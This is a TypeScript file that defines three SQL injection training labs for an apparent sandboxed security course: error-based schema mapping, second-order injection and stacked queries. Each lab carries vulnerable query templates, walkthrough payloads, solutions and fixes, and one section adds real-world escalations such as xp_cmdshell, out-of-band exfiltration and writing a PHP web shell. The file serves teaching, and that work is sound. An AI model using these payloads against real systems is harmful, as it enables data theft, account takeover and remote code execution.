import type { Lab } from '../types';
import { productsSeed, usersSeed } from './seeds';
import { fail, findFlag, pass, scalar } from './helpers';

export const advancedLabs: Lab[] = [
  {
    id: 'error-disclosure',
    title: 'Verbose Errors: Mapping the Schema',
    category: 'advanced',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'The app prints raw database errors. Use them as a debugger for someone else\'s schema, then extract.',
    brief: [
      'This blog renders the database driver\'s exception text directly into the page — the single most common finding in year-one penetration tests.',
      'You are not told which tables exist. Errors will tell you: `no such table`, `no such column`, and `near "x": syntax error` are all schema facts.',
      'There is a `private_notes` table. Find it, work out its columns, and read it.',
    ],
    objective: 'Recover the secret from `private_notes` using error messages plus a UNION.',
    appURL: 'https://blog.acme.io/post?id=1',
    seed: [
      `CREATE TABLE posts (id INTEGER PRIMARY KEY, title TEXT, body TEXT);`,
      `INSERT INTO posts (title, body) VALUES
         ('Hello world', 'First post.'),
         ('On call rotations', 'How we schedule on-call.'),
         ('Hiring: backend engineer', 'We are growing.');`,
      `CREATE TABLE private_notes (id INTEGER PRIMARY KEY, owner TEXT, secret TEXT);`,
      `INSERT INTO private_notes (owner, secret) VALUES
         ('finance', 'wire approval limit: 25000'),
         ('admin', 'FLAG{error_based_disclosure}');`,
    ],
    fields: [{ id: 'id', label: 'id parameter', placeholder: '1', value: '1' }],
    query: (v) => `SELECT id, title, body FROM posts WHERE id = ${v.id}`,
    hints: [
      'The error text is data. Read it carefully.',
      'Guess a table name in a SELECT and the error names it back. Guess a column and it says "no such column".',
      'Once you have the columns, the post query has three of them — pad your UNION accordingly.',
    ],
    walkthrough: [
      {
        title: 'Errors are an oracle',
        text: [
          'Send a malformed query. The full driver message comes back, which tells you the query is being parsed with your input inside it.',
        ],
        payload: `1'`,
        result: 'unrecognized token / incomplete input — plus the full statement.',
      },
      {
        title: 'Ask the engine about tables',
        text: [
          'Reference a table that does not exist and the error confirms the namespace you are querying. Then enumerate for real:',
        ],
        payload: `0 UNION SELECT 1, 2, group_concat(name) FROM sqlite_master WHERE type='table'--`,
        result: 'posts, private_notes',
      },
      {
        title: 'Ask about columns',
        text: ['`pragma_table_info` beats guessing, but errors work too — reference a wrong column and the message tells you it does not exist.'],
        payload: `0 UNION SELECT 1, 2, group_concat(name) FROM pragma_table_info('private_notes')--`,
        result: 'id, owner, secret',
      },
      {
        title: 'Extract',
        text: ['Three columns, three values.'],
        payload: `0 UNION SELECT id, owner, secret FROM private_notes--`,
        result: 'admin | FLAG{error_based_disclosure}',
      },
      {
        title: 'Error-based extraction in other engines',
        text: [
          'When UNION is blocked but errors are shown, engines can be made to put data *inside* the error:',
          'MySQL: `AND extractvalue(1,concat(0x7e,(SELECT value FROM secrets)))` → `XPATH syntax error: \'~FLAG{...}\'`, or `AND updatexml(1,concat(0x7e,(SELECT value)),1)`, or `AND GTID_SUBSET(CONCAT(0x7e,(SELECT value)),1)`.',
          'PostgreSQL: `AND 1=CAST((SELECT value FROM secrets) AS int)` → "invalid input syntax for integer". MSSQL: `AND 1=CONVERT(int,(SELECT TOP 1 value FROM secrets))`. Oracle: `AND 1=UTL_INADDR.GET_HOST_NAME((SELECT value FROM secrets))`.',
          'All of them turn a type cast into an outbound data channel with no UNION needed.',
        ],
      },
      {
        title: 'Fix',
        text: ['Return a generic error page with a correlation id. Log the detail server-side. Disable `display_errors` in production, and set `sqlite3` — or any driver — to a user that cannot read tables outside its schema.'],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Recovered from a private table: ${flag}`);
      if (out.error) return fail(`That produced an error: ${out.error} — errors are information, use them.`);
      return fail('No flag in the response yet. Find the hidden table first.');
    },
    solution: { id: `0 UNION SELECT id, owner, secret FROM private_notes--` },
  },

  {
    id: 'second-order',
    title: 'Second-Order Injection: Stored, Then Fired',
    category: 'advanced',
    difficulty: 'Expert',
    dbms: 'SQLite',
    summary: 'The signup form is safely parameterised. It also stores your payload, and another endpoint later pastes it into a query.',
    brief: [
      'Registration uses a prepared statement. Whoever wrote that code did it right, and a scanner pointed at the signup endpoint will find nothing.',
      'The password-reset endpoint reads the username back out of the database and concatenates it into an UPDATE. The payload you stored at signup fires there — in a completely different request, days later, from a different process.',
      'This is why "we escape on input" is the wrong mental model: the danger is the sink, not the source.',
    ],
    objective: 'Take over the `admin` account by storing a username that is only dangerous when it is read back.',
    appURL: 'https://accounts.acme.io/signup',
    seed: usersSeed(),
    fields: [
      { id: 'username', label: 'Choose a username', placeholder: 'newbie', value: 'newbie' },
      { id: 'password', label: 'Choose a password', placeholder: 'N3wP@ss!', value: 'N3wP@ss!' },
    ],
    setup: (db, v) => [
      `Registration: INSERT INTO users (username, password, role) VALUES (?, ?, 'user') — parameterised, no injection.`,
      `Stored username: ${JSON.stringify(v.username)}`,
      `Reset service: changing password for the stored username…`,
    ],
    query: (v) => `UPDATE users SET password = '${v.password}' WHERE username = '${v.username}'`,
    followUp: (db) => ({
      label: 'users (after the reset service ran)',
      results: db.exec(`SELECT id, username, role, password FROM users`),
    }),
    hints: [
      'You cannot break the INSERT — it is parameterised. You can only choose what gets stored.',
      'Think about what the stored value will look like when it is spliced into `UPDATE ... WHERE username = \'<stored>\'`.',
      'Store `admin\'--`. The update then applies to the admin row and the trailing password condition is commented away.',
    ],
    walkthrough: [
      {
        title: 'Two sinks, one source',
        text: [
          'Registration (safe):',
          'UPDATE (unsafe):',
        ],
        payload: `db.run("INSERT INTO users (username,password,role) VALUES (?,?,?)", [u, p, 'user'])
db.exec(\`UPDATE users SET password = '\${stored}' WHERE username = '\${u}'\`)`,
        result: 'The first call cannot be injected. The second one can.',
      },
      {
        title: 'Choose a harmless-looking payload',
        text: [
          'Pick a value that is a valid username *and* valid SQL when spliced. `admin\'--` is both: it becomes a real row at signup, and at reset time it becomes a comment.',
        ],
        payload: `admin'--`,
        result: 'Stored. Nothing happens yet — this is the "second order" part.',
      },
      {
        title: 'Fire it',
        text: ['Submit the form. The reset service reads your username back out and builds the UPDATE.'],
        payload: `UPDATE users SET password = 'N3wP@ss!' WHERE username = 'admin'--'`,
        result: 'The admin password is now the password you chose. Check the users table below.',
      },
      {
        title: 'Why scanners miss it',
        text: [
          'Source and sink live in different requests, often different services, sometimes weeks apart. Input validation at the edge cannot help; only a parameterised sink can.',
          'Real-world examples: a support agent pastes a stored name into an admin panel, a nightly ETL job concatenates a stored email into an UPDATE, a report generator builds SQL from a saved filter.',
        ],
      },
      {
        title: 'Fix',
        text: ['Parameterise the reset query. Treat every database value as untrusted — "it came from our own database" is not a trust boundary.'],
      },
    ],
    check: (_out, db, values) => {
      const adminPw = scalar(db, `SELECT password FROM users WHERE username = 'admin'`);
      if (adminPw !== null && adminPw === values.password) {
        return pass('Admin password replaced. Your stored username executed in a completely different request.');
      }
      return fail('The admin row is untouched — your stored username was treated as data. Store something that becomes SQL later.');
    },
    solution: { username: `admin'--`, password: `N3wP@ss!` },
  },

  {
    id: 'stacked-queries',
    title: 'Stacked Queries: Escalating Privileges',
    category: 'advanced',
    difficulty: 'Expert',
    dbms: 'SQLite (stacked queries enabled)',
    summary: 'The driver allows multiple statements per call. Stop reading data and start writing it.',
    brief: [
      'This internal stock checker passes an id to a driver that happily executes several statements separated by semicolons (SQLite, PostgreSQL, MSSQL and PHP\'s `mysqli_multi_query` all can).',
      'Everything so far in this course has been a read primitive. A stacked query is a *write* primitive: INSERT, UPDATE, DELETE — or in some configurations, a whole new administrative account.',
      'The goal is to become an administrator in the application\'s own user table.',
    ],
    objective: 'Change the role of user `jdoe` to `admin` without any legitimate admin action.',
    appURL: 'https://ops.acme.io/stock?id=1',
    seed: [...usersSeed(), ...productsSeed()],
    fields: [{ id: 'id', label: 'id parameter', placeholder: '1', value: '1' }],
    query: (v) => `SELECT id, name, price FROM products WHERE id = ${v.id}`,
    followUp: (db) => ({ label: 'users (after your query)', results: db.exec(`SELECT id, username, role FROM users`) }),
    hints: [
      'SQLite, PostgreSQL and MSSQL allow `SELECT 1; SELECT 2` in one call. MySQL only allows it through drivers that expose multi-statement mode.',
      'Terminate the first statement with a semicolon, then start a fresh one.',
      'The second statement can be an UPDATE. It does not have to return rows.',
    ],
    walkthrough: [
      {
        title: 'Test whether stacking works',
        text: ['Start with a harmless second statement. If you get two result sets, or no error at all, the driver supports it.'],
        payload: `1; SELECT 1`,
        result: 'Two result sets came back — semicolons are not blocked.',
      },
      {
        title: 'Read anything you like',
        text: ['A stacked SELECT is just a lazier UNION.'],
        payload: `1; SELECT username, password FROM users`,
        result: 'Full credential list in an extra result set.',
      },
      {
        title: 'Write',
        text: ['Now escalate. The UPDATE result set is empty, but the side effect is the point.'],
        payload: `1; UPDATE users SET role='admin' WHERE username='jdoe'`,
        result: 'jdoe is now an administrator. Log in as jdoe and you own the app.',
      },
      {
        title: 'Where this leads in the real world',
        text: [
          'MSSQL: `; EXEC xp_cmdshell \'whoami\'` (if enabled), `; EXEC sp_configure` to enable OLE automation, or `xp_dirtree` for out-of-band SMB exfiltration.',
          'PostgreSQL: `; COPY (SELECT \'<?php system($_GET[c]); ?>\') TO \'<webroot>/shell.php\'` on a superuser account; or `pg_read_file()` for arbitrary file read.',
          'MySQL: `; INTO OUTFILE \'<webroot>/shell.php\'` requires FILE privilege and a writable web root — the classic path from SQLi to RCE.',
          'SQLite: `; ATTACH DATABASE \'<path>/new.db\' AS x;` writable-file tricks, plus `.shell`-style extensions in some embeddings.',
          'Also note: stacked queries can CREATE triggers, which fire later — a persistence mechanism.',
        ],
      },
      {
        title: 'Fix',
        text: ['Parameterisation prevents the injection; disabling multi-statement APIs and giving the app a least-privilege database user limits the damage when it happens anyway.'],
      },
    ],
    check: (_out, db) => {
      const role = scalar(db, `SELECT role FROM users WHERE username = 'jdoe'`);
      if (role === 'admin') {
        return pass('jdoe is an administrator. You turned a read primitive into a write primitive.');
      }
      return fail(`jdoe's role is "${role}" — the second statement did not run, or it did not UPDATE the role.`);
    },
    solution: { id: `1; UPDATE users SET role='admin' WHERE username='jdoe'` },
  },
];
